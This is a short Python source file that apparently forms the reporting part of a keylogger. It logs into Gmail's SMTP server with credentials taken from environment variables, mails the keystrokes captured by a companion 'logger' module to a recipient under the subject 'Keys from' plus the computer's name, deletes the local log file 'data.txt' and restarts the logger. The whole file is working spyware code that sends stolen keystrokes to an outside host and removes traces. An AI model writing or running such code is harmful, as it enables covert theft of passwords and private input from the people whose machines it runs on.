import smtplib
from os import *
import logger


def send_email():
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(environ['email_from'], environ['password'])
    subject = f'Keys from {environ["COMPUTERNAME"]}'
    message = f'Subject: {subject}\n\n{logger.get_keys().split(" ")}'
    remove('data.txt')
    server.sendmail(environ['email_from'], environ['email_to'], message)
    server.quit()
    logger.main()
